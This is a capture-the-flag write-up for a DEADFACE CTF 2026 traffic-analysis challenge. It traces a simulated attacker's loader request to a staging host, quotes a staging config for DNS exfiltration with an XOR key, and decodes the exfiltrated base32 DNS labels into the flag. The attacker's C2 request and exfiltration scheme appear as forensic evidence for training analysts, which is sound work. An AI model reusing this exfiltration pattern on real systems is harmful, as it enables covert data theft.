---
title: "Bad Guys Be Bad"
tags:
  - DEADFACE CTF 2026
  - Forensics
  - Traffic
---

# Bad Guys Be Bad

| | |
|---|---|
| **CTF** | DEADFACE CTF 2026 |
| **Category** | Traffic analysis |
| **Points** | 350 |
| **Writeup by** | [TheMusk3teers](../../../members.md)<br>[chaimae098](https://github.com/chaimae098) · Lyna · [fatimaezzahralag-ship-it](https://github.com/fatimaezzahralag-ship-it) |

## Challenge

> Find the DEADFACE member's "deepest darkest secret", hidden on some external file location.

Files given: `deadface_pcap02.pcap`

## Solution

### 1. Triage

The capture is small (about 65 KB) and mostly noise: repeated DNS lookups and plain `HTTP GET /` requests to common sites (google, github, reddit, wikipedia, cloudflare, Microsoft Update, weather, s3.amazonaws and others). Each one returns `200 OK` with a 2-byte body. With that much repetition, the useful traffic is whatever breaks the pattern.

There was no Wireshark or tshark, so `strings` and a small Python pcap parser did the job. Sorting strings by frequency puts the rare ones at the top:

```bash
strings -n 4 capture.pcap | sort | uniq -c | sort -n
```

The rare strings that stood out:

- the host `deadface-c2.net`
- five DNS labels, `s00-…` to `s04-…`
- a non-browser User-Agent, `X-Loader/1.0`
- a text blob starting with `# staging config -- do not commit`

### 2. The loader and the staging config

One HTTP request doesn't look like the others:

```http
GET /staging.bin HTTP/1.1
Host: 45.13.37.7:8080
User-Agent: X-Loader/1.0 (bmljZSB0cnkgLSB3cm9uZyB0aHJlYWQsIGtlZXAgZGlnZ2luZw==)
```

The response is `application/octet-stream`, 106 bytes of plaintext:

```
# staging config -- do not commit
mode=exfil
channel=dns
xor_key=Sp00ky
target=exfil.deadface-c2.net
```

That's the whole recipe: the data leaves over **DNS**, to **exfil.deadface-c2.net**, XOR-encrypted with the key **`Sp00ky`**.

!!! note "Decoys"
    The base64 in the User-Agent decodes to `nice try - wrong thread, keep digging`. A second base64 string, `aWRsZQ==`, decodes to `idle`, which is just C2 beaconing. Neither one matters.

### 3. Extracting the exfil chunks

Pull every DNS query name containing `exfil` and de-duplicate them (each query appears three times, like retransmits):

| Seq | Query label |
|---|---|
| s00 | `G4KVCVANDAYB` |
| s01 | `KS2TLETCOASR` |
| s02 | `KYGRAMBPKJKT` |
| s03 | `IGZGANBVSBI6` |
| s04 | `FY` |

The `sNN-` prefix is a sequence number, so the order is unambiguous. Every payload character is `A-Z` or `2-7`, the base32 alphabet.

### 4. Decoding

Join the chunks, pad to a multiple of 8, base32-decode, then XOR with the repeating key:

```python
import base64
s = 'G4KVCVANDAYB' + 'KS2TLETCOASR' + 'KYGRAMBPKJKT' + 'IGZGANBVSBI6' + 'FY'
s += '=' * (-len(s) % 8)
b = base64.b32decode(s)
k = b'Sp00ky'
print(bytes(c ^ k[i % len(k)] for i, c in enumerate(b)))
# b'deadface{c2_traffic_be_bussing}'
```

The output starts with `deadface{`, which confirms both the key and the chunk order.

| Step | Finding |
|---|---|
| Anomaly | `X-Loader/1.0` fetching `/staging.bin` from `45.13.37.7:8080` |
| Config leak | `channel=dns`, `xor_key=Sp00ky`, `target=exfil.deadface-c2.net` |
| Exfil | 5 base32 labels on `sNN-<data>.exfil.deadface-c2.net` |
| Decode | base32, then XOR with `Sp00ky` |

## Flag

!!! flag "Flag"
    `deadface{c2_traffic_be_bussing}`

## Takeaways

In a noisy capture, `sort | uniq -c | sort -n` on the strings surfaces the odd traffic fast. When a config names a channel and a key, follow it exactly. The base64 in the obvious place is often bait.
